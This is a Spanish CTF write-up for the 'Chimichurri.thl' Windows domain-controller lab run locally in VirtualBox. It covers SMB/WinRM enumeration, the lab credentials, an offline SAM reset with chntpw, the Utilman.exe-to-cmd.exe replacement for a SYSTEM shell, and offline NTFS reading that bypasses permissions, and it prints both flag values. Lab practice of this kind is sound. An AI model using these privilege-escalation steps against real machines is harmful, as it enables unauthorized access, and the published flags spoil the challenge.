# ROADMAP — CHIMICHURRI.THL (The Hackers Labs)

> Máquina: **Chimichurri.thl** · Windows Server 2016 · Dominio **CHIMICHURRI**
> Rol: **Controlador de Dominio (DC)** con `NTDS.dit` (Active Directory)
> Red: host-only `vboxnet0` (192.168.56.0/24)
> Disco: `Chimichurri.thl-disk001.vdi` (30 GB virtuales)
> Backup del disco original: `Chimichurri.thl-disk001.vdi.bak`

---

## 1. Reconocimiento y acceso a la red

```bash
VBoxManage list runningvms
VBoxManage showvminfo "Chimichurri.thl" | grep -i NIC
ip -br a ; ip route
```
- Interfaz host-only `vboxnet0` en `192.168.56.1/24`.
- DHCP de VirtualBox en `192.168.56.2` (pool `.101–.254`).
- Escaneo (sin root, TCP connect):
  ```bash
  nmap -Pn -sT -p 22,53,88,135,139,389,445,464,636,3389,5985,9389 192.168.56.0/24
  ```

### Problemas de red típicos
- La VM arranca con **APIPA (169.254.x.x)** o sin lease → no responde.
- Revisar leases y enlace:
  ```bash
  VBoxManage dhcpserver findlease --interface=vboxnet0 --mac-address=0800273FF90C
  VBoxManage controlvm "Chimichurri.thl" setlinkstate1 off
  VBoxManage controlvm "Chimichurri.thl" setlinkstate1 on
  ```
- Comprobar estado en consola:
  ```bash
  VBoxManage controlvm "Chimichurri.thl" screenshotpng /tmp/vm.png
  ```

## 2. Enumeración (con red funcional)

```bash
nmap -sV -sC -p- <IP>
# Puertos esperados de DC:
# 53 DNS · 88 Kerberos · 135 MSRPC · 139/445 SMB
# 389/636 LDAP(S) · 464 kpasswd · 3268/3269 GC · 5985 WinRM · 9389 ADWS
```
Comprobaciones:
```bash
nxc smb <IP> -u '' -p ''            # null session
nxc ldap <IP>                       # RootDSE
kerbrute userenum ...               # usuarios
```
- `C:\drogas\credenciales.txt` (pista): usar el usuario **hacker**.
- `C:\Users\hacker\Desktop\perico.txt` → credenciales **`hacker:Perico69`**.

```bash
nxc smb <IP> -u hacker -p 'Perico69'
nxc winrm <IP> -u hacker -p 'Perico69'
```

## 3. Escalada a Administrator / root

- Con `hacker` se lee el **user flag**.
- Para el **root flag** hace falta ser Administrador.
- Como no había credenciales de admin, la vía limpia es un **reset offline** o el **truco de Utilman**.
- En un DC, **editar el SAM local NO sirve**: las cuentas de dominio viven en `NTDS.dit`.

### Reset offline (lo que se intentó)
```bash
VBoxManage controlvm "Chimichurri.thl" poweroff
qemu-img convert -f vdi -O raw "…-disk001.vdi" chimichurri.raw
mmls chimichurri.raw                       # NTFS en sector 1026048
fls -r -p part.ntfs | grep -i "config/SAM"
icat part.ntfs <inode-SAM> > SAM
chntpw -u "Administrador" SAM              # opción 1 = borrar password
```
> ⚠️ En un DC esto **no cambia el login de dominio** (sigue fallando con contraseña vacía).
> Para un DC hay que tocar `NTDS.dit` o usar `Utilman.exe → cmd.exe` para una consola SYSTEM.

### Truco Utilman (recomendado en DC)
```bash
# offline: reemplazar Utilman.exe por cmd.exe en el disco
fls -r -p part.ntfs | grep -iE "System32/(Utilman|cmd)\.exe"
# luego, en la pantalla de login: botón de accesibilidad (Win+U) → cmd como SYSTEM
# desde ahí: net user Administrador <nueva_pass>   (en DC gestiona la cuenta de dominio)
```

### Arreglo del disco en VirtualBox
Si al restaurar el VDI la VM no arranca (`NS_ERROR_FAILURE`), es por **UUID distinto**:
```bash
VBoxManage internalcommands sethduuid "<ruta>.vdi" <UUID-esperado>
```
El UUID esperado está en `~/.config/VirtualBox/VirtualBox.xml` / `<vm>.vbox`.

## 4. Flags

| Flag | Valor | Ubicación |
|---|---|---|
| **user** | `acrsgvs6edr8f5vaw9a8eadv6fa9b` | `C:\Users\hacker\Desktop\user.txt` |
| **ROOT** | `hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa` | `C:\Users\Administrador\Desktop\root.txt` |

## 5. Vía usada (offline)

```bash
qemu-img convert -f vdi -O raw "…-disk001.vdi" chimichurri.raw
# NTFS empieza en sector 1026048 (byte 525336576)
dd if=chimichurri.raw of=part.ntfs bs=512 skip=1026048
fls -r -p part.ntfs | grep -iE "(root|user)\.txt"
icat part.ntfs <inode-root.txt>        # → hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa
```

---

## 6. ANÁLISIS FINAL — ¿por qué el root tardó en encontrarse?

1. **Error de concepto inicial: editar el SAM.** Chimichurri es un **DC**; las cuentas (incluido Administrator) están en `NTDS.dit`, no en el SAM local. Por eso `chntpw` dejaba la contraseña "*BLANK*" pero el login seguía diciendo *"La contraseña no es correcta"*.
2. **Falso positivo `THL{...}`.** La cadena
   `THL{9A88909B-7317-47B0-9B75-BC52EFC46D95}`
   parecía el flag, pero es la concatenación del nombre de la GPO (`CHIMICHURRI.THL`) + su GUID en el registro:
   `…\Group Policy Objects\CHIMICHURRI.THL{9A88909B-…}Machine`.
   No era un flag; hizo perder tiempo.
3. **El flag real no estaba "suelto"**: era `root.txt` en el escritorio del **Administrador**, inaccesible sin ser admin. Se obtuvo leyendo el disco **offline**, saltándose los permisos NTFS.
4. **La red estaba caída** (APIPA / sin lease DHCP), así que no se podía atacar por SMB/WinRM; se perdió tiempo en descubrimiento de IP.
5. **VirtualBox no arrancaba** tras restaurar el disco por el **UUID del VDI** distinto (`NS_ERROR_FAILURE`); había que corregirlo con `sethduuid`.
6. La ruta correcta era: pista `C:\drogas\credenciales.txt` → `perico.txt` (`hacker:Perico69`) → `user.txt` → escalar a Administrator → `root.txt`. La lectura offline del NTFS fue el atajo definitivo.
